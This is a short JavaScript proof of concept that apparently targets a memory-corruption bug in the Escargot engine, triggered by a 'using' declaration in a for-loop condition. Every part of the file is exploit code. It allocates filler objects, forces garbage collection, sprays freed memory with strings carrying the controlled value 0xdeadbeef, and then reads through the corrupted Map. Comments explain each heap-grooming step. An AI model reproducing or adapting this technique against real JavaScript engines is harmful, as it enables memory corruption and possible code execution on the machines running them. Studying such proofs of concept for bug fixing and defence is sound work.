let filler = [];
for (let i = 0; i < 600000; i++) {
    filler.push({ value: i });
}

const resource = {};

function disposeLikeMethod() {
    return disposeLikeMethod;
}

async function f(value) {
    // The condition replaces the register that cleanup later reads.
    for (using x = null; pass(value);) {
        break;
    }
}

function pass(value) {
    return value;
}

const map = new Map();
const neighbor = new Set([1, 2]);
map.set(resource, disposeLikeMethod);

// Allocate this Map's structure after the filler objects.
map.marker = 1;

// Keep the Map and release the objects below its structure.
filler = null;
gc();

const strings = [];
// Escargot reads 16 bytes after this value: 0xdeadbeef.
const readBase = "\xdf\xbe\xad\xde\x00\x00\x00\x00";
for (let i = 0; i < 5000; i++) {
    // Fill the released memory with the value above.
    const text = readBase.repeat(500) + i;

    // Read one character so Escargot stores the complete string.
    text.charCodeAt(text.length - 1);
    strings.push(text);
}

f(map).then(() => {
    // This property access uses the corrupted Map.
    print(map.length);
    print(neighbor.size);
    print(strings.length);
});
